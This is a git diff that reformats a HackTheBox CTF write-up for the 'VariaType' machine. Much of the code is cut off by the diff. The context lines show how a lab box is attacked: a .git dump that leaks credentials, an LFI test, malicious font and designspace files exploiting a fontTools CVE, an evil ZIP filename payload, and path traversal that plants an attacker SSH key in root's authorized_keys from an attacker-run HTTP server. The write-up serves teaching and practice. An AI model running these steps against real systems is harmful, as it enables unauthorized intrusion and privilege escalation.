@@ -1,31 +1,57 @@
-# VariaType (Avatar) - HackTheBox CTF Writeup
+<div align="center">
 
-**Target IP:** <Target_IP>  
-**Difficulty:** Medium  
-**Flags:**
-- user.txt: `<REDACTED_USER_FLAG>`
-- root.txt: `<REDACTED_ROOT_FLAG>`
+# VariaType — HackTheBox
+
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | VariaType |
+| IP | `<Target_IP>` |
+| OS | Linux |
+| Difficulty | Medium |
+| Hostname | variatype.htb |
+
 ## Table of Contents
+
 1. [Reconnaissance](#reconnaissance)
-2. [Initial Access - Git Repo & LFI](#initial-access)
-3. [RCE via CVE-2025-66034](#rce)
-4. [Privilege Escalation to steve](#privesc-steve)
-5. [Privilege Escalation to root](#privesc-root)
-6. [Full Automation Script](#automation)
+2. [Initial Access - Git Repo and LFI](#initial-access---git-repo-and-lfi)
+3. [RCE via CVE-2025-66034](#rce-via-cve-2025-66034)
+4. [Privilege Escalation to steve](#privilege-escalation-to-steve)
+5. [Privilege Escalation to root](#privilege-escalation-to-root)
+6. [Full Automation Script](#full-automation-script)
+7. [Key Vulnerabilities Used](#key-vulnerabilities-used)
+8. [Lessons Learned](#lessons-learned)
+9. [Flags](#flags)
 
 ---
 
 ## Reconnaissance
 
 ### Nmap Scan
+
 ```bash
 nmap -sC -sV -oN nmap.txt <Target_IP>
 ```
 
 **Results:**
+
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1
@@ -33,13 +59,16 @@ PORT   STATE SERVICE VERSION
 ```
 
 ### Host Discovery
+
 ```bash
 # Add to /etc/hosts
 echo "<Target_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Git Repository Exposure
+
 The portal subdomain has an exposed `.git` directory:
+
 ```bash
 curl -s http://portal.variatype.htb/.git/HEAD
 # Output: ref: refs/heads/master
@@ -47,9 +76,10 @@ curl -s http://portal.variatype.htb/.git/HEAD
 
 ---
 
-## Initial Access
+## Initial Access - Git Repo and LFI
 
 ### Step 1: Dump Git Repository
+
 ```bash
 # Install git-dumper
 pip3 install git-dumper --break-system-packages
@@ -60,6 +90,7 @@ cd git-repo
 ```
 
 ### Step 2: Extract Credentials from Git History
+
 ```bash
 # Check git log
 git log --oneline --all
@@ -72,12 +103,14 @@ git show 6f021da6be7086f2595befaa025a83d1de99478b
 ```
 
 **Credentials Found:**
+
 ```
 Username: gitbot
 Password: G1tB0t_Acc3ss_2025!
 ```
 
 ### Step 3: Login and Test LFI
+
 ```bash
 # Login and save cookie
 curl -s -X POST http://portal.variatype.htb/ \
@@ -96,6 +129,7 @@ curl -s -b "PHPSESSID=$PHPSESSID" \
 ## RCE via CVE-2025-66034
 
 ### Vulnerability Details
+
 - **CVE:** CVE-2025-66034
 - **Type:** Arbitrary File Write + XML Injection in fontTools.varLib
 - **Affected:** fontTools versions 4.33.0 to 4.60.2
@@ -103,6 +137,7 @@ curl -s -b "PHPSESSID=$PHPSESSID" \
 ### Step 4: Create Malicious Font Files
 
 **Script: `make_fonts.py`**
+
 ```python
 from fontTools.fontBuilder import FontBuilder
 from fontTools.pens.ttGlyphPen import TTGlyphPen
@@ -131,6 +166,7 @@ print("[+] Generated source-light.ttf and source-regular.ttf")
 ```
 
 Run:
+
 ```bash
 python3 make_fonts.py
 ```
@@ -138,6 +174,7 @@ python3 make_fonts.py
 ### Step 5: Create Malicious Designspace
 
 **File: `malicious.designspace`**
+
 ```xml
 <designspace format="5.0">
 <axes>
@@ -183,6 +220,7 @@ curl -s -b "PHPSESSID=$PHPSESSID" \
 ## Privilege Escalation to steve
 
 ### Step 7: Generate SSH Key for steve
+
 ```bash
 ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
 # Public key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgrO8KNJoyQAVGH8j0SXVo1ttnRnHJmhkC3vTa8ipdU steve@pwn
@@ -191,6 +229,7 @@ ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
 ### Step 8: Create Evil ZIP (CVE-2024-25082)
 
 **Script: `make_evil_zip.py`**
+
 ```python
 import zipfile
 
@@ -207,11 +246,13 @@ print(f"Payload filename: {payload[:60]}...")
 ```
 
 Run:
+
 ```bash
 python3 make_evil_zip.py
 ```
 
 ### Step 9: Upload and Wait for Cron
+
 ```bash
 # Start HTTP server
 python3 -m http.server 8888 &
@@ -234,11 +275,13 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> "whoami && cat ~/
 ## Privilege Escalation to root
 
 ### Step 10: Check Sudo Permissions
+
 ```bash
 ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> "sudo -l"
 ```
 
 **Output:**
+
 ```
 (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
 ```
@@ -246,11 +289,13 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> "sudo -l"
 ### Step 11: Exploit Path Traversal in install_validator.py
 
 Generate root SSH key:
+
 ```bash
 ssh-keygen -t ed25519 -f root_key -N "" -C "root@pwn"
 ```
 
 Create HTTP server to serve key:
+
 ```python
 # serve_root_key.py
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -270,6 +315,7 @@ HTTPServer(("0.0.0.0", 8889), H).serve_forever()
 ```
 
 Run exploit:
+
 ```bash
 # Start server
 python3 serve_root_key.py &
@@ -280,12 +326,14 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@<Target_IP> \
 ```
 
 **Output:**
+
 ```
 [INFO] Plugin installed at: /root/.ssh/authorized_keys
 [+] Plugin installed successfully.
 ```
 
 ### Step 12: SSH as root
+
 ```bash
 ssh -o StrictHostKeyChecking=no -i root_key root@<Target_IP> "whoami && cat /root/root.txt"
 ```
@@ -485,4 +533,22 @@ echo "[*] Done!"
 5. **URL-encoded absolute paths** (`%2Froot%2F.ssh`) can bypass path validation
 
 ---
-For educational purposes only*
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| User | `<REDACTED>` |
+| Root | `<REDACTED>` |
+
+---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — VariaType*
+
+</div>
